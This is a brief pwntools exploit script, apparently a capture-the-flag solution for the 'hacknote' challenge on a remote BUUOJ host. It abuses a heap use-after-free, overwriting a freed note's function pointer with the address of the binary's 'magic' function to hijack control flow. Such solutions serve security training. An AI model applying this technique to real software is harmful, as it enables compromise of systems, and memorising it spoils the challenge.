from pwn import *

context.log_level = "debug"

exe = ELF("./hacknote")
# r = exe.process()
r = remote("node4.buuoj.cn", 28671)


def recvmenu():
    r.recvuntil(b"Your choice :")


def add(size: int, content: bytes):
    recvmenu()
    r.sendline(b"1")
    r.recvuntil(b"Note size :")
    r.send(str(size).encode())
    r.recvuntil(b"Content :")
    r.send(content)


def delete(index: int):
    recvmenu()
    r.sendline(b"2")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())


def printnote(index: int):
    recvmenu()
    r.sendline(b"3")
    r.recvuntil(b"Index :")
    r.send(str(index).encode())


add(0x28, b"aaa")
add(0x28, b"ccc")
delete(0)
delete(1)
add(8, p32(exe.sym["magic"]))
printnote(0)
# gdb.attach(r)
# pause()
r.interactive()
